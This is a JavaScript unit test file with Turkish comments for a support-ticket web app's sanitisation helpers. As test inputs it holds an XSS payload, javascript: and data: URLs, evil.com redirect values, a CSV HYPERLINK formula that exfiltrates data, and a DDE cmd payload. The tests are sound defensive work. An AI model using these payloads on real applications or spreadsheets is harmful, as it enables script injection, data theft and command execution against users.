/**
 * WP-02 / WP-11 birim testleri: çıktı güvenliği yardımcıları, CSV formül nötrleme, hata sınıflandırma,
 * işlem koruması (withInflight), aktivite etiketleri, arama normalizasyonu.
 * Çalıştırma: node --test tests/unit/client-safe.test.mjs
 */
import test from "node:test";
import assert from "node:assert/strict";
import {
  safeToken,
  safeClass,
  safeText,
  safeNumber,
  safeHttpUrl,
  safeNextPath,
  isSafeId,
  PRIORITY_TOKENS,
} from "../../assets/js/support-v2/safe-utils.js";
import { csvCell, buildCsv } from "../../assets/js/support-v2/export-utils.js";
import { classifyError, withInflight, withTimeout, errorStateHtml, loadingStateHtml } from "../../assets/js/support-v2/ui-states.js";
import { formatActivityAction, formatActivityEntity, isDeleteAction, describeActivity, activityIconClass } from "../../assets/js/support-v2/activity-labels.js";
import { normalizeSearch, matchesSearch } from "../../assets/js/support-v2/ticket-utils.js";
import { password, validateTicketForm, TICKET_LIMITS } from "../../assets/js/support-v2/validators.js";
import { resolveNextForRole } from "../../assets/js/support-v2/auth-guard.js";

const XSS = `"'><img src=x onerror=window.__xss=1>`;

/* ------------------------------------------------------------------ safeToken / safeClass */
test("safeToken: beyaz listedeki değer döner, saldırı yükü varsayılana düşer", () => {
  assert.equal(safeToken("HIGH", PRIORITY_TOKENS, "medium"), "high");
  assert.equal(safeToken("critical", PRIORITY_TOKENS, "medium"), "critical");
  assert.equal(safeToken(XSS, PRIORITY_TOKENS, "medium"), "medium");
  assert.equal(safeToken({ a: 1 }, PRIORITY_TOKENS, "medium"), "medium");
  assert.equal(safeToken(null, PRIORITY_TOKENS), "");
  assert.equal(safeToken("low ", PRIORITY_TOKENS, "x"), "x");
  assert.equal(safeToken("low", new Set(["low"]), "x"), "low");
});

test("safeClass: yalnız güvenli sınıf simgeleri", () => {
  assert.equal(safeClass("customer"), "customer");
  assert.equal(safeClass("In_Progress-2"), "in_progress-2");
  assert.equal(safeClass(XSS), "");
  assert.equal(safeClass("a b"), "");
  assert.equal(safeClass(123), "123");
  assert.equal(safeClass(undefined), "");
  assert.equal(safeClass("x".repeat(41)), "");
});

test("safeText / safeNumber / isSafeId", () => {
  assert.equal(safeText(null), "");
  assert.equal(safeText(undefined), "");
  assert.equal(safeText(5), "5");
  assert.equal(safeText({ a: 1 }), "");
  assert.equal(safeText(["x"]), "");
  assert.equal(safeNumber("<img onerror=x>", 0), 0);
  assert.equal(safeNumber("2.5"), 2.5);
  assert.equal(safeNumber(""), 0);
  assert.equal(safeNumber(NaN, 7), 7);
  assert.equal(isSafeId("-Nabc_123"), true);
  assert.equal(isSafeId("a.b"), false);
  assert.equal(isSafeId("t1/../t2"), false);
  assert.equal(isSafeId(""), false);
  assert.equal(isSafeId(5), false);
});

/* ------------------------------------------------------------------ attachment_url */
test("safeHttpUrl: yalnız http(s)", () => {
  assert.equal(safeHttpUrl("https://drive.google.com/file/d/1?usp=sharing"), "https://drive.google.com/file/d/1?usp=sharing");
  assert.equal(safeHttpUrl("http://example.com"), "http://example.com/");
  assert.equal(safeHttpUrl("javascript:alert(1)"), "");
  assert.equal(safeHttpUrl("JaVaScRiPt:window.__xss=1"), "");
  assert.equal(safeHttpUrl("java\tscript:alert(1)"), "");
  assert.equal(safeHttpUrl("data:text/html,<script>1</script>"), "");
  assert.equal(safeHttpUrl("vbscript:x"), "");
  assert.equal(safeHttpUrl("//evil.com"), "");
  assert.equal(safeHttpUrl("ftp://x.com/a"), "");
  assert.equal(safeHttpUrl(""), "");
  assert.equal(safeHttpUrl(null), "");
  assert.equal(safeHttpUrl({}), "");
  assert.equal(safeHttpUrl("https://" + "a".repeat(3000)), "");
});

/* ------------------------------------------------------------------ next (açık yönlendirme) */
test("safeNextPath: yalnız /support-v2/ altı göreli yollar", () => {
  assert.equal(safeNextPath("/support-v2/customer/ticket-detail.html?id=t1"), "/support-v2/customer/ticket-detail.html?id=t1");
  assert.equal(safeNextPath("/support-v2/admin/tickets.html#x"), "/support-v2/admin/tickets.html#x");
  for (const bad of ["https://evil.com", "//evil.com", "/index.html", "/support-v2/../index.html", "/support-v2//evil.com", "javascript:alert(1)", "/support-v2/\\evil", "", null, undefined, "/support-v2/login.html", "/support-v2/auth-action.html?mode=x", "/support-v2/x\n.html"]) {
    assert.equal(safeNextPath(bad), "", String(bad));
  }
});

test("resolveNextForRole: rol uyuşmazlığında aynı talebin kendi sayfasına, aksi halde boş", () => {
  assert.equal(resolveNextForRole("/support-v2/customer/ticket-detail.html?id=t1", "consultant"), "/support-v2/admin/ticket-detail.html?id=t1");
  assert.equal(resolveNextForRole("/support-v2/admin/ticket-detail.html?id=t1", "customer"), "/support-v2/customer/ticket-detail.html?id=t1");
  assert.equal(resolveNextForRole("/support-v2/customer/ticket-detail.html?id=t1", "customer"), "/support-v2/customer/ticket-detail.html?id=t1");
  assert.equal(resolveNextForRole("/support-v2/admin/users.html", "customer"), "");
  assert.equal(resolveNextForRole("/support-v2/customer/profile.html", "super_admin"), "");
  assert.equal(resolveNextForRole("https://evil.com", "customer"), "");
  assert.equal(resolveNextForRole("/support-v2/customer/tickets.html", "norole"), "");
});

/* ------------------------------------------------------------------ CSV */
test("csvCell: formül başlatan metinler nötrlenir, sayılar korunur", () => {
  assert.equal(csvCell('=HYPERLINK("http://evil/?d="&A2,"x")'), `"'=HYPERLINK(""http://evil/?d=""&A2,""x"")"`);
  assert.equal(csvCell("=1+1"), `"'=1+1"`);
  assert.equal(csvCell("+90 530 111 22 33"), `"'+90 530 111 22 33"`);
  assert.equal(csvCell("-2+3"), `"'-2+3"`);
  assert.equal(csvCell("@SUM(A1)"), `"'@SUM(A1)"`);
  assert.equal(csvCell("\tcmd"), `"'\tcmd"`);
  assert.equal(csvCell("\rcmd"), `"'\rcmd"`);
  assert.equal(csvCell(-5), "-5");
  assert.equal(csvCell(2.25), "2.25");
  assert.equal(csvCell("normal metin"), `"normal metin"`);
  assert.equal(csvCell('tırnak "içinde"'), `"tırnak ""içinde"""`);
  assert.equal(csvCell("satır\nsonu"), `"satır\nsonu"`);
  assert.equal(csvCell(null), `""`);
  assert.equal(csvCell(undefined), `""`);
  assert.equal(csvCell({ a: 1 }), `""`);
  assert.equal(csvCell("a;b"), `"a;b"`);
});

test("buildCsv: ';' ayraç ve her hücre (başlık dahil) nötrlenir", () => {
  const csv = buildCsv(["NO", "KONU"], [["T-1", "=cmd|' /C calc'!A0"], ["T-2", "Normal; noktalı virgüllü"]]);
  const lines = csv.split("\r\n");
  assert.equal(lines[0], `"NO";"KONU"`);
  assert.equal(lines[1], `"T-1";"'=cmd|' /C calc'!A0"`);
  assert.equal(lines[2], `"T-2";"Normal; noktalı virgüllü"`);
  assert.equal(buildCsv(["a"], [], ","), `"a"`);
});

/* ------------------------------------------------------------------ hata sınıflandırma */
test("classifyError: geliştirici/Firebase metni son kullanıcıya gösterilmez", () => {
  const perm = classifyError({ code: "PERMISSION_DENIED", message: "Permission denied" });
  assert.equal(perm.kind, "permission");
  assert.ok(!/Firebase|Console|Rules/i.test(perm.message));
  assert.equal(classifyError(new Error("PERMISSION_DENIED: Attempt to read /v2/x")).kind, "permission");
  assert.equal(classifyError({ code: "permission-denied" }).kind, "permission");
  assert.equal(classifyError({ code: "auth/network-request-failed" }).kind, "network");
  assert.equal(classifyError(new TypeError("Failed to fetch")).kind, "network");
  assert.equal(classifyError({ code: "timeout", message: "Bağlantı yok." }).message, "Bağlantı yok.");
  assert.equal(classifyError(new Error("not_authenticated")).kind, "auth");
  const tech = classifyError(new Error("Firebase: Error (auth/internal-error)."));
  assert.ok(!/Firebase/.test(tech.message));
  assert.ok(!/is not a function/.test(classifyError(new TypeError("a.replace is not a function")).message));
  assert.equal(classifyError(new Error("Lütfen en az 3 karakterlik bir yanıt yazın.")).message, "Lütfen en az 3 karakterlik bir yanıt yazın.");
  assert.ok(classifyError(null).message.length > 5);
});

/* ------------------------------------------------------------------ işlem koruması */
test("withInflight: eşzamanlı ikinci çağrı çalışmaz, düğme etkin kalmaz/geri açılır", async () => {
  const btn = { disabled: false, attrs: {}, setAttribute(k, v) { this.attrs[k] = v; }, removeAttribute(k) { delete this.attrs[k]; } };
  let runs = 0;
  let release;
  const gate = new Promise((r) => (release = r));
  const first = withInflight(btn, async () => { runs += 1; await gate; return "ok"; });
  assert.equal(btn.disabled, true);
  assert.equal(btn.attrs["aria-busy"], "true");
  const second = await withInflight(btn, async () => { runs += 1; return "dup"; });
  const third = await withInflight(btn, async () => { runs += 1; return "dup2"; });
  assert.equal(second, undefined);
  assert.equal(third, undefined);
  release();
  assert.equal(await first, "ok");
  assert.equal(runs, 1);
  assert.equal(btn.disabled, false);
  assert.equal(btn.attrs["aria-busy"], undefined);
  // iş bitince yeniden çalışabilir
  assert.equal(await withInflight(btn, async () => "again"), "again");
});

test("withInflight: hata fırlasa da kilit açılır; ortak anahtar dizesi çalışır", async () => {
  await assert.rejects(withInflight("k1", async () => { throw new Error("x"); }), /x/);
  assert.equal(await withInflight("k1", async () => "sonra"), "sonra");
  let n = 0;
  const p = withInflight("k2", () => new Promise((r) => setTimeout(() => { n += 1; r(); }, 20)));
  await withInflight("k2", async () => { n += 100; });
  await p;
  assert.equal(n, 1);
});

test("withTimeout: zaman aşımında code=timeout ile reddeder, hızlı sözü geçirir", async () => {
  await assert.rejects(withTimeout(new Promise(() => {}), 30, "Bağlantı yok"), (e) => e.code === "timeout" && e.message === "Bağlantı yok");
  assert.equal(await withTimeout(Promise.resolve(5), 100), 5);
});

test("durum bileşenleri: HTML kaçışlı ve erişilebilir", () => {
  const html = errorStateHtml({ title: XSS, message: XSS, actions: [{ label: XSS, href: `/x"><b>` }] });
  assert.ok(!html.includes("<img"));
  assert.ok(!html.includes('"><b>'));
  assert.ok(html.includes("data-sv2-retry"));
  assert.ok(html.includes('role="alert"'));
  assert.ok(!errorStateHtml({ retry: false }).includes("data-sv2-retry"));
  assert.ok(loadingStateHtml().includes('role="status"'));
});

/* ------------------------------------------------------------------ aktivite etiketleri / zehirli kayıt */
test("aktivite etiketleri: Türkçe, bilinmeyen kodlar okunur, zehirli değerler çökertmez", () => {
  assert.equal(formatActivityAction("ticket_closed"), "Talep Kapatıldı");
  assert.equal(formatActivityAction("ticket_deleted"), "Talep Silindi");
  assert.equal(formatActivityAction("some_new_event"), "Some new event");
  assert.equal(formatActivityAction(123), "123");
  assert.equal(formatActivityAction({ a: 1 }), "—");
  assert.equal(formatActivityAction(null), "—");
  assert.equal(formatActivityAction("constructor"), "Constructor");
  assert.equal(formatActivityEntity("sap_module"), "Modül");
  assert.equal(formatActivityEntity(5), "5");
  assert.equal(isDeleteAction("ticket_deleted"), true);
  assert.equal(isDeleteAction("deleted"), true);
  assert.equal(isDeleteAction("updated"), false);
  assert.equal(isDeleteAction(7), false);
  // Zehirli kayıt: action/details sayı, nesne, null
  for (const poison of [{ action: 123, details: 456 }, { action: { x: 1 }, details: [1] }, { action: null }, {}, null]) {
    assert.doesNotThrow(() => describeActivity(poison));
    assert.equal(typeof describeActivity(poison), "string");
    assert.doesNotThrow(() => activityIconClass(poison && poison.action));
  }
  assert.equal(describeActivity({ action: "ticket_message", entity_label: "T-1", details: "Yeni yanıt" }), "Yeni Mesaj: T-1 — Yeni yanıt");
});

/* ------------------------------------------------------------------ arama ve doğrulama */
test("normalizeSearch / matchesSearch: İ-ı ve aksan duyarsız, çok sözcüklü", () => {
  assert.equal(normalizeSearch("İSTANBUL Işık ÖZTÜRK ŞİŞECAM"), "istanbul isik ozturk sisecam");
  assert.equal(matchesSearch("ozturk istanbul", ["Can Öztürk", "İstanbul Şubesi"]), true);
  assert.equal(matchesSearch("DEMİR çelik", ["Demir Çelik San."]), true);
  assert.equal(matchesSearch("fatura hatası", ["Hata: fatura kesilemiyor"]), false);
  assert.equal(matchesSearch("satis", ["Satış ve Dağıtım"]), true);
});

test("validators: Türkçe büyük harf ve uzunluk sınırları", () => {
  assert.equal(password("sifre1234Ş"), true);
  assert.equal(password("sifre1234"), false);
  assert.equal(password("Sifre12"), false);
  const base = { ticket_type: "SUP", priority: "medium", sap_module: "FI", title: "Geçerli başlık", description: "A".repeat(30) };
  assert.equal(validateTicketForm(base).valid, true);
  assert.equal(validateTicketForm({ ...base, title: "T".repeat(TICKET_LIMITS.title) }).valid, true);
  assert.equal(validateTicketForm({ ...base, title: "T".repeat(TICKET_LIMITS.title + 1) }).valid, false);
  assert.equal(validateTicketForm({ ...base, description: "D".repeat(TICKET_LIMITS.description) }).valid, true);
  assert.equal(validateTicketForm({ ...base, description: "D".repeat(TICKET_LIMITS.description + 1) }).valid, false);
  assert.equal(TICKET_LIMITS.title, 200);
  assert.equal(TICKET_LIMITS.description, 10000);
});
